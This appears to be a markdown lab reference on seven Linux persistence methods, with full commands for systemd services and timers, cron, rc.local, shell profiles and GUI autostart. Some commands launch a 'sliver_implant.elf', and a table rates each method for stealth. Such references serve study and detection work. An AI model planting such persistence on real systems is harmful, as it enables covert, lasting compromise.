# Linux Persistence Techniques – Lab & Educational Reference

A common and advanced Linux persistence techniques for lab, study purposes and real world attack.

---

## 1. Systemd Service (System-Wide, Requires Root)

**Description:**  
Modern Linux systems use `systemd`. Creating a system service ensures the program runs at **system boot**, regardless of user login.

**Requirements:**  
- Root / sudo privileges

**Steps Example:**
```bash
# Make binary executable
chmod +x /usr/local/bin/lab-test-binary

# Create systemd service
sudo tee /etc/systemd/system/lab-test.service > /dev/null << 'EOF'
[Unit]
Description=Lab Persistence Test
After=network.target

[Service]
ExecStart=/usr/local/bin/lab-test-binary
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd and enable service
sudo systemctl daemon-reload
sudo systemctl enable lab-test.service
sudo systemctl start lab-test.service

# Check status
systemctl status lab-test.service
```
### Pros:
- Runs at boot
- Highly reliable
- Common in real attacks (educational)

### Cons:
- Requires root
- Easy to detect if monitored

## 2. User Systemd Service (Non-Root, Runs at Login)

Description:
For users without sudo, systemd also supports user services under ~/.config/systemd/user/.
```bash
mkdir -p ~/.config/systemd/user

cat << 'EOF' > ~/.config/systemd/user/lab-test.service
[Unit]
Description=User Mode Persistence Test

[Service]
ExecStart=/home/$USER/lab-test-binary
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
EOF

# Reload and enable user service
systemctl --user daemon-reload
systemctl --user enable lab-test.service
systemctl --user start lab-test.service
```
### Pros:
- No root required
- Runs every time the user logs in
- Very realistic in lab user compromise scenarios

### Cons:
- Runs only when user logs in
- Limited system impact

### 3. Crontab @reboot (Non-Root, Reboot-Based)

Description:
Cron jobs with @reboot can run commands automatically when the system boots.

```bash
crontab -e
# Add line
@reboot /home/$USER/lab-test-binary
```
### Pros:
- Simple to set up
- Runs at reboot automatically
- Works without root if added to user crontab
### Cons:
- Limited stealth
- Logs in cron can reveal activity
### 4. Shell Profile (.bashrc / .profile) Persistence (Non-Root, Login-Based)

Description:
Adding commands to `.bashrc or .profile` runs them when a user starts a shell session.
```bash
# Edit ~/.bashrc or ~/.profile
echo "/home/$USER/sliver_implant.elf &" >> ~/.bashrc
```
### Pros
- Very stealthy
- No root required

### Cons
- Only runs when user opens a shell
- Not executed on system boot
### 5. rc.local Persistence (Legacy, Root Required)
Some distros still support `/etc/rc.local`.
```bash
sudo tee -a /etc/rc.local > /dev/null << EOF
/usr/local/bin/sliver_implant.elf &
EOF
sudo chmod +x /etc/rc.local
```
### Pros
- Old but simple
- Runs at boot
### Cons
- Many modern distros disable it by default

### 6. GUI Autostart (Desktop Environments)
For `GNOME`, `XFCE`, `KDE`, etc., applications can be added to `~/.config/autostart/`.
- Example (.desktop file)
```bash
mkdir -p ~/.config/autostart

cat << EOF > ~/.config/autostart/lab-test.desktop
[Desktop Entry]
Type=Application
Exec=/home/$USER/lab-test-binary
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=Lab Autostart
EOF
```
### Pros
- Great for desktop environments
- No root required
### Cons
- Not useful on servers
- Visible in system GUI

## 7. Systemd Timers (Scheduled Task Alternative to Cron)

More modern than cron; works like Windows Scheduled Tasks.
- Example timer
```bash
sudo tee /etc/systemd/system/lab-test.timer > /dev/null << 'EOF'
[Unit]
Description=Run Lab Test Periodically

[Timer]
OnBootSec=30s
OnUnitActiveSec=5m

[Install]
WantedBy=timers.target
EOF
```
### Timer service
```bash
sudo tee /etc/systemd/system/lab-test.service > /dev/null << 'EOF'
[Unit]
Description=Lab Test Task

[Service]
ExecStart=/usr/local/bin/lab-test-binary
EOF
```
### Enable
```bash
sudo systemctl daemon-reload
sudo systemctl enable lab-test.timer
sudo systemctl start lab-test.timer
```

## Summary Table

| Technique          | Root Needed | Runs at Boot | User Login | Reliability | Stealth     |
|--------------------|-------------|--------------|------------|-------------|-------------|
| **Systemd service** | ✔ Yes       | ✔ Yes        | ❌ No       | ⭐⭐⭐⭐⭐       | ⭐⭐⭐         |
| **User systemd**    | ❌ No        | ❌ No         | ✔ Yes       | ⭐⭐⭐⭐        | ⭐⭐⭐⭐        |
| **Cron @reboot**    | ❌/✔        | ✔ Yes        | ❌ No       | ⭐⭐⭐⭐        | ⭐⭐          |
| **.bashrc / .profile** | ❌ No     | ❌ No         | ✔ Yes       | ⭐⭐          | ⭐⭐⭐⭐⭐       |
| **rc.local**        | ✔ Yes       | ✔ Yes        | ❌ No       | ⭐⭐⭐         | ⭐⭐⭐         |
| **GUI autostart**   | ❌ No        | ❌ No         | ✔ Yes       | ⭐⭐⭐         | ⭐⭐⭐         |
| **Systemd timers**  | ✔ Yes       | ✔ Yes        | ❌ No       | ⭐⭐⭐⭐        | ⭐⭐⭐         |

